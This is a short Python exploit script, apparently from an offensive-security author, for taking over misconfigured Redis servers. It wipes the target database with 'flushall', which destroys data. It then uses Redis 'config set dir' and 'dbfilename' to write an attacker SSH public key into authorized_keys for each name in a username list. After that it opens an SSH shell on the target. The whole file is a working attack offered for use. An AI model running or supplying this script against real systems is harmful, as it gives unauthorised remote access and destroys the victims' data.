#!/usr/bin/python
#Author : Avinash Kumar Thapa aka -Acid
#Twitter : https://twitter.com/m_avinash143
#####################################################################################################################################################

import os
import os.path
from sys import argv
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("target_address", help="IP address of the Redis server.")
parser.add_argument("user_file", help="Path for list of usernames.")
parser.add_argument("-p", "--port", help="Redis port, default is 6379.")
parser.add_argument("-s", "--ssh_port", help="SSH port, default is 22.")
args = parser.parse_args()

ip_address = args.target_address
user_file = args.user_file

if args.ssh_port:
	ssh_port = args.ssh_port
else:
	ssh_port = '22'

if args.port:
	port = args.port
else:
	port = '6379'

usernames = []

with open(user_file, 'r') as file:
	for line in file:
		word = line.replace('\n', '')
		usernames.append(word)

PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def ssh_connection(port):
	shell = "ssh -i " + '$HOME/.ssh/id_rsa -p ' + port + ' ' + username+"@"+ip_address
	os.system(shell)

if os.path.isfile(PATH) or os.path.isfile(PATH1):
	for username in usernames:
		try:
			print('\t*******************************************************************')
			print('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*')
			print('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ')
			print('\t*******************************************************************')
			print("\n")
			print("\t SSH Keys Need to be Generated")
			os.system('ssh-keygen -t rsa -C \"acid_creative\"')
			print("\t Keys Generated Successfully")
			os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
			cmd = "redis-cli -h " + ip_address + ' flushall'
			cmd1 = "redis-cli -h " + ip_address
			os.system(cmd)
			cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -p ' + port + '-x set cracklist'
			os.system(cmd2)
			cmd3 = cmd1 + ' config set dbfilename "backup.db" '
			cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
			cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
			cmd6 = cmd1 + ' save'
			os.system(cmd3)
			os.system(cmd4)
			os.system(cmd5)
			os.system(cmd6)
			print("\tYou'll get shell in sometime..Thanks for your patience")
			ssh_connection(ssh_port)

		except:
			print("Something went wrong")
else:
	print("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.")







